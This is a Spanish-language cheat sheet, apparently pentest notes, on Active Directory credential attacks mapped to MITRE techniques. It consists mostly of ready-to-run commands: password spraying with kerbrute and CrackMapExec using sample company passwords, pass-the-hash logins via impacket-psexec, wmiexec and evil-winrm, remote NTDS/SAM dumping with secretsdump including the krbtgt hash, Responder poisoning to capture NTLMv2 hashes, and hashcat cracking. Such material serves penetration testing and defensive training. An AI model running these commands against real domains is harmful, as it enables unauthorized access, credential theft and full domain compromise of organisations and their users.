# Ataques de Credenciales en Active Directory

---

## Password Spraying (T1110.003)

Prueba una contraseña común contra muchos usuarios.
**Diferencia con brute-force:** evita el lockout probando 1 contraseña por usuario.

```bash
# Kerbrute (muy rápido, usa Kerberos directamente)
kerbrute passwordspray -d empresa.local --dc 192.168.1.10 \
    usuarios.txt 'Empresa2024!'

# CrackMapExec — SMB
crackmapexec smb 192.168.1.10 -u usuarios.txt -p 'Empresa2024!' \
    --continue-on-success

# CrackMapExec — WinRM
crackmapexec winrm 192.168.1.10 -u usuarios.txt -p 'Empresa2024!'

# Impacket — verificar una credencial
impacket-smbclient empresa.local/juan:'Password123!'@192.168.1.10
```

**Contraseñas típicas a probar:**
```
Empresa2024!   EmpresaABC1!   Bienvenido1!
[Mes][Año]!    [Empresa]123!  Password1!
```

---

## Pass-the-Hash (T1550.002)

Usar el hash NTLM **sin necesidad de la contraseña en texto plano**.
Funciona porque NTLM autentica con el hash directamente.

```bash
# Obtener el hash (necesitas sesión con privilegios)
# Desde Meterpreter:
meterpreter> hashdump
# → Administrador:500:aad3b435...:31d6cfe0d16ae931b73c59d7e0c089c0:::

# PTH con CrackMapExec
crackmapexec smb 192.168.1.41 \
    -u Administrador \
    -H "31d6cfe0d16ae931b73c59d7e0c089c0"  # Solo el NT hash

# PTH con impacket-psexec (shell interactiva)
impacket-psexec empresa.local/Administrador@192.168.1.41 \
    -hashes :31d6cfe0d16ae931b73c59d7e0c089c0

# PTH con impacket-wmiexec
impacket-wmiexec empresa.local/Administrador@192.168.1.41 \
    -hashes :31d6cfe0d16ae931b73c59d7e0c089c0

# PTH con evil-winrm
evil-winrm -i 192.168.1.41 \
    -u Administrador \
    -H "31d6cfe0d16ae931b73c59d7e0c089c0"
```

---

## Credential Dumping con Secretsdump (T1003.002)

Dumping remoto de hashes NTLM del SAM y NTDS.dit.

```bash
# Remoto — con credenciales válidas de Domain Admin
impacket-secretsdump empresa.local/Administrador:'Password123!'@192.168.1.10

# Remoto — con hash (PTH)
impacket-secretsdump empresa.local/Administrador@192.168.1.10 \
    -hashes :31d6cfe0d16ae931b73c59d7e0c089c0

# Output típico:
# Administrador:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931...
# juan.garcia:1103:aad3b435b51404eeaad3b435b51404ee:8f49f2e2b1d3e4a5...
# krbtgt:502:aad3b435b51404eeaad3b435b51404ee:a1b2c3d4e5f6...  ← Para Golden Ticket

# Crackear los hashes obtenidos
hashcat -m 1000 hashes_ntlm.txt /usr/share/wordlists/rockyou.txt
```

---

## LLMNR/NBT-NS Poisoning con Responder (T1557.001)

Envenenar resoluciones de nombres en la red local para capturar hashes NTLMv2.

```bash
# Lanzar Responder en la interfaz de red del laboratorio
sudo responder -I eth0 -wF

# Esperar a que algún usuario en la red intente acceder a un recurso
# que no existe — Responder capturará el hash NTLMv2

# Los hashes NTLMv2 capturados se guardan en:
# /usr/share/responder/logs/

# Crackear con hashcat (-m 5600 = NTLMv2)
hashcat -m 5600 ntlmv2_hashes.txt /usr/share/wordlists/rockyou.txt
```
